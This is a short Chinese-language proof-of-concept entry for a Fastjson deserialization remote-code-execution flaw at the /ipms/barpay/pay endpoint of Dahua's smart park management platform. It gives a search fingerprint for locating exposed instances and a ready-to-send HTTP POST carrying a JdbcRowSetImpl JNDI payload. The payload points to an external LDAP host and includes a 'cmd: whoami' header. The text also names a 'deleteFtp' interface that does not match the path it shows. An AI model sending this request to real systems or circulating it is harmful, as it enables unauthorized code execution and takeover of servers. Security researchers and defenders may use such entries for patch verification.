﻿# 大华智慧园区综合管理平台 ipms_barpay_pay RCE漏洞

> 更新时间：2024-02-20

> 漏洞编号：

> 漏洞说明：大华园区综合管理平台可能是一个集成多种管理功能的平台，例如安全监控、设备管理、人员管理等。这样的平台通常有助于提高园区运营效率和安全性。

大华园区综合管理平台/ipms/barpay/pay，deleteFtp 接口处存在Fastjson反序列化漏洞 恶意攻击者可能会执行恶意代码，造成服务器失陷

> 漏洞特征：app="dahua-智慧园区综合管理平台"

> 验证脚本：HTTP

```
POST /ipms/barpay/pay HTTP/1.1
Content-Type: application/json
Accept-Encoding: gzip
Connection: close
cmd:whoami
 
{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://www.baidu.com", "autoCommit": true}
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：大华智慧园区综合管理平台 ipms_barpay_pay RCE漏洞.poc
